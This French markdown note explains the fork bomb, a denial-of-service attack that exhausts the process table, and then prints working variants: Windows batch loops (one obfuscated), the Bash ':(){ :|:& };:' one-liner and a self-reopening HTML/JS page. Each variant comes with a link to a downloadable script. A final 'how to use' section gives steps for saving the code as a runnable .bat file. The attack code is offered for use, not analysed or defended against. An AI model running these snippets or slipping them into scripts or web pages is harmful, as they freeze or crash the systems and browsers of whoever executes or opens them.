# Fork bomb
La fork bomb est une forme d'attaque par déni de service contre un système informatique utilisant la fonction fork.  

Elle est basée sur la supposition que le nombre de programmes et de processus pouvant être exécutés simultanément sur un ordinateur est limité.

## Principe
Une fork bomb fonctionne en créant un grand nombre de processus très rapidement, au moyen de la fonction fork, afin de saturer l'espace disponible dans la liste des processus gardée par le système d'exploitation.  

Si la table des processus se met à saturer, aucun nouveau programme ne peut démarrer tant qu'aucun autre ne termine.  

Même si cela arrive, il est peu probable qu'un programme utile démarre étant donné que les instances de la bombe attendent chacune d'occuper cet emplacement libre.

# Code
```
@echo off
:start
start
goto :start
```
[forkBomb.bat](https://github.com/Altherneum/.github/blob/main/note/OS/Windows/Scripts/forkbomb.bat)

## Variante Windows (Batch)
```
%0|%0
```
[forkBomb2.bat](https://github.com/Altherneum/.github/blob/main/note/OS/Windows/Scripts/forkbomb2.bat)

## Variante Windows 2 (Batch)
```
@echo.%0^|%0>$^_^.c^md&$_>nul
```
[forkBomb3.bat](https://github.com/Altherneum/.github/blob/main/note/OS/Windows/Scripts/forkbomb3.bat)

## Variante Linux (Bash)
```
:(){ :|:& };:
```
[forkBomb.sh](https://github.com/Altherneum/.github/blob/main/note/OS/Linux/forkBomb.sh)

## Variante HTML / JS
```
<script type="text/javascript">
  function open_target_blank() 
  {
    window.open(window.location);
  }
  window.onload = open_target_blank();
</script>
```
[forkBomb.html](https://github.com/Altherneum/.github/blob/main/note/Code/Web/HTML/forkBomb.html)

# Comment utiliser

## Créer le fichier
- Créer un fichier [NOM].bat
- Modifier le text du fichier avec le code suivant : [Code](#Code)
- Vérifier que vous enregistrez bien le type de fichier en "Tout type de fichier" et non pas text uniquement
![notepad_hreGWL4UXj](https://saveAsMatrice.bat.png)